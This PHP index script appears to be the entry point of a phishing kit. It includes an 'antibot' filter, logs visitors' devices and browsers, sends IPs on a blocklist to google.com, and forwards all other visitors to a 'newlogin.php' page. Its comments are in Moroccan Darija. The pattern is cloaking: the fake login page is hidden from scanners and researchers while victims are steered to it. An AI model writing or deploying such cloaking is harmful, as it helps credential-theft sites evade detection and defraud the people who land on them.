<?php
    session_start();
    include "./Assets/php/config/config.php";   
    include "./Assets/php/prevents/antibot.php";
    $visitors = Visitors();
    get_device_and_browser();
    
    $file = "./data/blocker.json";
    $data = json_decode(file_get_contents($file), true);
    
    // 1. Check dyal l-IP blocker
    if (in_array(get_client_ip(), $data)) {
        header('Location: https://google.com/');
        exit();
    }

    // 2. Redirect l-ghadi l newlogin.php direct
    header('Location: ./newlogin.php');
    exit();
?>
